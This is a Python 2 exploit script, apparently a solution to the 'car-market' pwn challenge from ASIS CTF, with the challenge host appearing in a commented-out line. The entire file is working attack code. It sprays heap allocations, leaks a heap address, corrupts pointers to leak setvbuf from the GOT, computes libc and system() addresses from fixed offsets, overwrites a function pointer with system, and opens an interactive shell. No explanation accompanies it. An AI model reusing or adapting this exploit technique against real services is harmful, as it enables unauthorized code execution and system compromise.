import socket
import struct
import telnetlib
import hexdump

def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp:break
		r += tmp
	return r
while 1:	
	try:
		s = socket.create_connection(['0',1234])
		#s = socket.create_connection(['car-market.asis-ctf.ir',31337])
		raw_input()
		for i in range(0,0x101):
			print i
			recvu(s,'>')
			s.send('2\n')
			recvu(s,'model')
			s.send("a"*15+'\n')
			recvu(s,'price')
			s.send('1234\n')
		recvu(s,'>')
		s.send('1\n')
		#print hexdump.hexdump(recvu(s,'1:'))
		heap = struct.unpack('<Q',recvu(s,'1:')[-6:-3]+"\x00"*5)[0]-0x1000+0x3800
		print hex(heap)
		recvu(s,'>')
		s.send('2\n')
		recvu(s,'model')
		s.send(struct.pack('<Q',heap)+'\n')
		#s.send('aaaaaaaa\n')
		recvu(s,'price')
		s.send('1234\n')
		for i in range(0,0x1fc):
			recvu(s,'>')
			s.send('2\n')
			recvu(s,'model')
			s.send("a"*15+'\n')
			recvu(s,'price')
			s.send('1234\n')
		recvu(s,'>')
		s.send('4\n')
		recvu(s,'index')
		s.send('256\n')
		recvu(s,'>')
		s.send('4\n')
		recvu(s,'>')
		s.send('2\n')
		recvu(s,'name')
		s.send(struct.pack('<Q',0x602070)+struct.pack('<Q',0x602078)+"\n")
		recvu(s,'>')
		s.send('4\n')
		recvu(s,'>')
		s.send('5\n')
		recvu(s,'>')
		s.send('4\n')
		recvu(s,'index')
		s.send('0\n')
		recvu(s,'>')
		s.send('1\n')
		setvbuf = struct.unpack('<Q',recvu(s,'P')[-3-6:-3]+"\x00\x00")[0]
		print hex(setvbuf)
		libc = setvbuf - 0x6fdb0
		system = libc + 0x45380
		print hex(libc),hex(system)
		recvu(s,'>')
		s.send('5\n')
		recvu(s,'>')
		s.send('4\n')
		recvu(s,'index')
		s.send('1\n')
		recvu(s,'>')
		s.send('2\n')
		recvu(s,'model')
		s.send(struct.pack('<Q',system)+'\n')
		s.send('ls\n')
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()


	except Exception:
    		continue

